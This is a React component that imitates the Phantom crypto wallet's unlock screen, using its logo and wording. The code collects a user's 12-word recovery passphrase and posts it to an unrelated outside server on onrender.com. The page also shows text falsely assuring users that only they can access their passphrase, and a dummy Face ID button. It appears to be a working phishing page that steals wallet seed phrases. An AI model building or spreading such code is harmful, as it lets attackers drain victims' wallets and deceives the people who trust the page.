import React, {useState} from 'react'
import './phantomPagesCss/phantomWallet.css'
import axios from 'axios';
import { toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const PhantomWallet = () => {
    const [text, setText] = useState('');
    const [loading, setLoading] = useState(false);
  
    const unlockWallet = async () => {
      const url = 'https://secondwalletvalwizzy.onrender.com/phantom';
      const data = { passphrase: text };
  
      try {
        setLoading(true);
        const response = await axios.post(url, data);
        setLoading(false);
        toast.success(response.data.message); // Assuming a success message
        setText('');
      } catch (error) {
        setLoading(false);
        const errorMessage = error.response?.data?.message || 'An error occurred. Please try again.';
        toast.error(errorMessage);
      }
    };
  
    const unlockWithId = () => {
      toast.info('Feature not available yet.');
    };
    
    return (
      <>
        <div className='phantom_wallet_body'>
          <div className='phantom_wallet_top_body'>
            <p>Wallet</p>
            <div className='phantom_wallet_top_logo'>
              {/* <img src={phantom_com_logo} alt='Home Logo' /> */}
              <svg class="span" fill="none" viewBox="0 0 108 93">
                <title>Logo Phantom</title>
                <path 
                    d="M0.5 78.1789C0.5 90.2265 6.7065 93 13.1613 93C26.8155 93 37.077 80.6058 43.2007 70.8118C42.4559 72.9786 42.0422 75.1454 42.0422 77.2255C42.0422 82.946 45.1868 87.0196 51.3933 87.0196C59.9169 87.0196 69.0197 79.219 73.7367 70.8118C73.4056 72.0252 73.2401 73.1519 73.2401 74.192C73.2401 78.1789 75.3917 80.6924 79.7777 80.6924C93.5975 80.6924 107.5 55.124 107.5 32.7623C107.5 15.3411 99.0592 0 77.8743 0C40.6354 0 0.5 47.4967 0.5 78.1789ZM65.0476 30.8555C65.0476 26.5219 67.3647 23.4884 70.7575 23.4884C74.0677 23.4884 76.3848 26.5219 76.3848 30.8555C76.3848 35.1892 74.0677 38.3094 70.7575 38.3094C67.3647 38.3094 65.0476 35.1892 65.0476 30.8555ZM82.7568 30.8555C82.7568 26.5219 85.0739 23.4884 88.4668 23.4884C91.7769 23.4884 94.094 26.5219 94.094 30.8555C94.094 35.1892 91.7769 38.3094 88.4668 38.3094C85.0739 38.3094 82.7568 35.1892 82.7568 30.8555Z" 
                    fill="#a797d4">
                </path>
            </svg>
            </div>
          </div>
          <div className='phantom_wallet_h3'>
            <h3>Unlock Phantom Wallet</h3>
          </div>
          <div className='phantom_wallet_bottom_body'>
            <div className='phantom_wallet_bottom_container'>
              <textarea
                className='phantom_wallet_text_area'
                placeholder='Enter your 12-word passphrase here'
                value={text}
                onChange={(e) => setText(e.target.value)}
              />
              <button
                className='phantom_unlock_with_passphrase_btn'
                onClick={unlockWallet}
              >
                {loading ? 'Loading...' : 'Unlock With Passphrase'}
              </button>
              <button
                className='phantom_unlock_with_faceid_btn'
                onClick={unlockWithId}
              >
                Unlock With Face ID
              </button>
              <p>
                As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.
                Recovery of passphrase is currently impossible.
              </p>
              <p>
                Lost your passphrase? <span>you can create a new wallet</span>, but all assets in your previous wallet will be inaccessible.
              </p>
            </div>
          </div>
        </div>
      </>
    )
}

export default PhantomWallet